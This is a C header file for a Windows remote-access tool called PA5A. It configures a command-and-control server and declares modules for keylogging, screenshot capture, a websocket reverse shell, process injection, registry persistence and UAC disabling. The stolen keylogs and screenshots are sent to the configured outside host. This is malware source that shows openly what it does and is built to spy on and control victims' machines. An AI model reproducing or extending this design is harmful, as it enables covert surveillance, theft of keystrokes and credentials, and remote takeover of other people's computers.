#pragma once

#pragma comment(lib, "gdiplus")
#pragma comment(lib, "crypt32")
#pragma comment(lib, "wininet")
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "Userenv")
#pragma comment(lib, "iphlpapi")
#pragma comment(lib, "psapi")

#include <libwebsockets.h>
#include <stdio.h>
#include <stdlib.h>
#include <cjson/cJSON.h>
#include <Windows.h>
#include <WinInet.h>
#include <wincrypt.h>
#include <string.h>
#include <time.h>
#include <strsafe.h>
#include <Psapi.h>
#include <shlwapi.h>
#include <gdiplus.h>
#include <tlhelp32.h>

#include "../resources/resource.h"


EXTERN_C_START
//BOOL WINAPI SaveBitmap(LPCWSTR wPath);

#pragma warning(disable:4996) // replace strcpy

static struct lws_context* context;
static CRITICAL_SECTION lockFile;
#define BUFSIZE 4096

/******************************CONFIGURATION******************************/
//Pour afficher les informations de debogage
#define DEBUG

#define DATA_FOLDER_A		"C:\\ProgramData\\PA5A\\"
#define DATA_FOLDER_W		L"C:\\ProgramData\\PA5A\\"
#define EXECUTABLE_FILE_A	"PA5A.exe"
#define EXECUTABLE_FILE_W	L"PA5A.exe"
#define DLL_FILE_A			"PA5A.dll"
#define DLL_FILE_W			L"PA5A.dll"
#define SCREENSHOT_FILE_W	L"screenshot.jpeg"
#define SERVER_NAME_A		"pa5a.cyberfilou.fr"
#define SERVER_NAME_W		L"pa5a.cyberfilou.fr"
#define USER_AGENT_A		"PA5A-BOT"
#define USER_AGENT_W		L"PA5A-BOT"
#define HTTP_PORT			80
#define HTTPS_PORT			443
#define CLIENT_API_A		"/api/clients/"
#define COMMANDS_API_A		"/commands"
#define KEYLOGS_API_A		"/keylogs"
#define SCREENSHOT_API_A	"/screenshot"
#define REVERSE_SHELL_WS_A  "/reverseshell";
#define PATH_SIZE			2048
#define URL_SIZE			4096
#define UUID_SIZE			256
#define COMPUTER_NAME_SIZE	256

/******************************REVERSE SHELL******************************/
#define WS_SERVER_URL "wss://" SERVER_NAME_A REVERSE_SHELL_WS_A

//Structure for reverse shell
struct WebSocketData
{
	HANDLE hThreadRead;
	HANDLE hChildStd_Input_Rd;
	HANDLE hChildStd_Input_Wr;
	HANDLE hChildStd_Output_Rd;
	HANDLE hChildStd_Output_Wr;
	HANDLE hCmdProcess;
	struct lws* socket;
};

//LeagueOfLegends.cpp
DWORD ThreadLeagueOfLegends();

//injector.cpp
BOOL inject(DWORD processId);
DWORD GetProcessIdFormProcessName(LPCWSTR processName);
DWORD ThreadInjector();

//registry.cpp
BOOL SetRegistryKeyStringValue(LPCWSTR key, LPCWSTR name, LPCWSTR data);
BOOL SetRegistryKeyDwordValue(LPCWSTR key, LPCWSTR name, DWORD data);
BOOL SetPersistence();
BOOL DisableUac();

//shell.cpp
DWORD WINAPI ThreadProc(HANDLE wsData);
BOOL CreatePipes(struct WebSocketData* wsData);
int CreateChildProcess(LPCWSTR processName, struct WebSocketData* wsData);
BOOL WriteToPipe(char* command, struct WebSocketData* wsData);
BOOL ReadFromPipe(struct WebSocketData* wsData, char* buffer, size_t length);
void PrintError(char* text, int err);

//ws.cpp
BOOL WS_Connection();
void send_data(struct mg_connection* sock, char* buffer);
static void event_handler(struct mg_connection* c, int ev, void* ev_data, void* wsData);

/******************************MAIN******************************/
typedef struct Commands
{
	BOOL keylogs;
	BOOL screenshot;
	BOOL reverseShell;
} Commands;

/********************************************************************************************************************************************************/
//main.cpp
DWORD ThreadKeylogger();
VOID SendKeylogs();
VOID SendScreenshot();
INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ INT nCmdShow);

/********************************************************************************************************************************************************/
//http.cpp
VOID GenerateBoundary(LPSTR buffer, SIZE_T size);
Commands GetCommands(LPCSTR server, DWORD port);
BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, LPCSTR userAgent, LPCSTR jsonData);
cJSON* CreateInformationsJsonObject();
BOOL SendClientInformations();
/********************************************************************************************************************************************************/
//Keylogger.cpp
LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam);
VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode);
cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path);
VOID WriteJsonObjectLogs(cJSON* newJsonObject);
/********************************************************************************************************************************************************/
//screenshot.cpp
INT WINAPI GetEncoderClsid(LPCWSTR format, CLSID* pClsid);
BOOL WINAPI SaveScreenshot(LPCWSTR filename);
/********************************************************************************************************************************************************/
//utils.cpp
VOID CreateConsole();

//Obtenir un timestamp UNIX en secondes ou en millisecondes
LONGLONG GetTimestamp(BOOL inMlliseconds);

int gettimeofday(struct timeval* tp, struct timezone* tzp);

//Obtenir un timestamp UNIX depuis une structure SYSTEMTIME
LONGLONG SystemTimeToUnixTimestamp(SYSTEMTIME system_time);

//Obtenir une structure SYSTEMTIME depuis un timestamp UNIX
SYSTEMTIME UnixTimestampToSystemTime(LONGLONG timestamp);

//Convertir une chaine de caractère unicode en UTF8
PCHAR encode_UTF8(LPCWCHAR messageUTF16);
/********************************************************************************************************************************************************/
//uuid.cpp
int GetUuid(char* uuid);

EXTERN_C_END